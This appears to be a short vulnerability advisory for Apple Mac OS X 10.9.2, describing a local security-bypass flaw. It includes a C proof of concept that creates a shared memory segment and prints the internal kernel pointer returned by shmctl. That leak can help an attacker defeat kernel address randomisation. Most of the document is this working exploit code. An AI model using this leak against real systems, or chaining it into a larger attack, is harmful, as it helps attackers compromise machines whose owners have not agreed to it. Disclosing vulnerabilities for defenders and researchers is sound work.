source: http://www.securityfocus.com/bid/67023/info

Apple Mac OS X is prone to a local security-bypass vulnerability.

Attackers can exploit this issue to bypass certain security restrictions and perform unauthorized actions.

Apple Mac OS X 10.9.2 is vulnerable; other versions may also be affected. 

#include <stdio.h>
#include <strings.h>
#include <sys/shm.h>

int main(int argc, char *argv[])
{
  int shm = shmget( IPC_PRIVATE, 0x1337, SHM_R | SHM_W );

  if (shm < 0)
    {
      printf("shmget: failed");
      return 6;
    }

  struct shmid_ds lolz;

  int res = shmctl( shm, IPC_STAT, &lolz );
  if (res < 0)
    {
      printf("shmctl: failed");
      return 1;
    }

  printf( "%p\n", lolz.shm_internal );

}